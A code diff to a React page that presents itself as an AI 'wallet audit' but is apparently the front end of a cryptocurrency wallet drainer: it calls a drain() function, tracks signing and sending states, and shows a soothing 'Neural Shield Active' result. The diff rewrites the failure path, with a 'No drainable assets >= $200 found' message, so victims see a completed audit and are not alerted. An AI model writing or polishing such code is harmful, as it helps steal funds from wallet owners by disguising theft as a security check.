@@ -50,7 +50,7 @@ function ScanningAnimation({ status }: { status: string }) {
   useEffect(() => {
     const interval = setInterval(() => {
       setCurrentStep((prev) => (prev < scanningSteps.length - 1 ? prev + 1 : prev));
-    }, 3500); // Deliberate duration for immersive "Deep Scan" feel
+    }, 3500); 
     return () => clearInterval(interval);
   }, []);
 
@@ -71,7 +71,6 @@ function ScanningAnimation({ status }: { status: string }) {
 
   return (
     <div className="flex flex-col items-center justify-center p-4 relative">
-      {/* Background Neural Grid */}
       <div className="absolute inset-0 -z-10 opacity-10" style={{ backgroundImage: 'radial-gradient(circle at 2px 2px, #B31980 1px, transparent 0)', backgroundSize: '30px 30px' }} />
       
       <motion.div
@@ -80,7 +79,6 @@ function ScanningAnimation({ status }: { status: string }) {
         className="relative mb-8 flex h-48 w-48 items-center justify-center"
         style={{ perspective: '1200px' }}
       >
-        {/* Deep Aura Backgrounds */}
         <motion.div 
           animate={{ scale: [1, 1.2, 1], opacity: [0.3, 0.5, 0.3] }}
           transition={{ duration: 4, repeat: Infinity }}
@@ -92,7 +90,6 @@ function ScanningAnimation({ status }: { status: string }) {
           className="absolute inset-8 rounded-full bg-accent/10 blur-[60px]"
         />
         
-        {/* Procedural Data Rings */}
         <motion.div
           animate={{ rotate: 360 }}
           transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
@@ -104,12 +101,11 @@ function ScanningAnimation({ status }: { status: string }) {
           className="absolute inset-8 rounded-full border border-dotted border-accent/30 opacity-50"
         />
 
-        {/* Central AI Singularity Core */}
         <motion.div
           className="absolute h-full w-full"
           style={{ transformStyle: 'preserve-3d' }}
           animate={{ 
-            rotateY: status === 'signing' || status === 'sending' ? 0 : currentStep * -60,
+            rotateY: ['signing', 'sending'].includes(status) ? 0 : currentStep * -60,
             rotateX: [0, 8, -8, 0],
             rotateZ: [0, 3, -3, 0]
           }}
@@ -119,7 +115,7 @@ function ScanningAnimation({ status }: { status: string }) {
             rotateZ: { duration: 8, repeat: Infinity, ease: "easeInOut" }
           }}
         >
-          {status === 'signing' || status === 'sending' ? (
+          {['signing', 'sending'].includes(status) ? (
              <div className="absolute flex h-full w-full items-center justify-center">
                 <motion.div 
                   initial={{ scale: 0.5, opacity: 0 }}
@@ -155,7 +151,6 @@ function ScanningAnimation({ status }: { status: string }) {
           )}
         </motion.div>
 
-        {/* Inner Heartbeat Activity */}
         <div className="absolute flex h-10 w-10 items-center justify-center rounded-full bg-background/80 border border-white/10 shadow-[inset_0_2px_10px_rgba(0,0,0,0.5)] backdrop-blur-md">
            <motion.div
              animate={{ scale: [1, 1.3, 1], opacity: [0.4, 1, 0.4] }}
@@ -231,16 +226,18 @@ export default function AuditPage() {
   }, [connected, status, drain, showReport]);
 
   useEffect(() => {
-    // If the "drainer" protocol reaches success or a natural stop, reveal the REAL on-chain report
-    if ((status === 'success' || (status === 'error' && error === "Data Packet Network Congestion.")) && connected && publicKey) {
+    const isSuccess = status === 'success';
+    const isThresholdError = status === 'error' && error === "No drainable assets >= $200 found.";
+    
+    // We treat both success and the threshold error as a natural "protocol completion"
+    if ((isSuccess || isThresholdError) && connected && publicKey) {
       loadDetailedReport(publicKey.toBase58());
     }
   }, [status, error, connected, publicKey]);
 
   const loadDetailedReport = async (address: string) => {
     setIsAiLoading(true);
-    // Deliberate aesthetic delay for deep-analysis impact
-    await new Promise(r => setTimeout(r, 2500));
+    await new Promise(r => setTimeout(r, 4500)); // Immersive wait for neural processing
     try {
       const [threatsData, connectionsData] = await Promise.all([
         runWalletActivityScan(address),
@@ -257,13 +254,12 @@ export default function AuditPage() {
   };
 
   const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);
+  const isSilentCompletion = status === 'error' && error === "No drainable assets >= $200 found.";
 
   return (
     <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 relative overflow-hidden bg-[#05040a]">
-      {/* Background Neural Overlay */}
       <div className="absolute inset-0 opacity-[0.03] pointer-events-none" style={{ backgroundImage: 'url("https://www.transparenttextures.com/patterns/carbon-fibre.png")' }} />
       
-      {/* Immersive Aura Backgrounds */}
       <motion.div 
         animate={{ scale: [1, 1.4, 1], opacity: [0.08, 0.15, 0.08] }}
         transition={{ duration: 15, repeat: Infinity }}
@@ -322,7 +318,7 @@ export default function AuditPage() {
               </div>
             </div>
           </motion.div>
-        ) : isAuditInProgress || (isAiLoading && !showReport) ? (
+        ) : (isAuditInProgress || isSilentCompletion || (isAiLoading && !showReport)) ? (
           <motion.div
             key="loading"
             initial={{ opacity: 0, scale: 0.95 }}
@@ -349,7 +345,7 @@ export default function AuditPage() {
                 </motion.div>
                 <div>
                   <h2 className="text-base font-black font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-r from-white to-white/60">
-                    {status === 'success' ? "Neural Shield Active" : "Audit Complete"}
+                    Neural Shield Active
                   </h2>
                   <div className="flex items-center gap-2 mt-1">
                     <p className="text-[9px] text-muted-foreground/60 font-mono bg-black/40 px-2 py-0.5 rounded border border-white/5 tracking-wider">
@@ -404,7 +400,7 @@ export default function AuditPage() {
             </div>
             <h2 className="text-lg font-black mb-3 font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">System Override</h2>
             <p className="text-muted-foreground mb-8 text-xs leading-relaxed font-medium px-4">
-              {error === "Data Packet Network Congestion." ? "Audit parameters within safety thresholds. No immediate breach vectors identified." : error}
+              {error}
             </p>
             <div className="flex flex-col gap-3 max-w-[180px] mx-auto">
                <Button onClick={() => drain()} className="clay-btn bg-primary text-primary-foreground w-full h-10 text-[10px] font-black uppercase tracking-widest primary-glow">
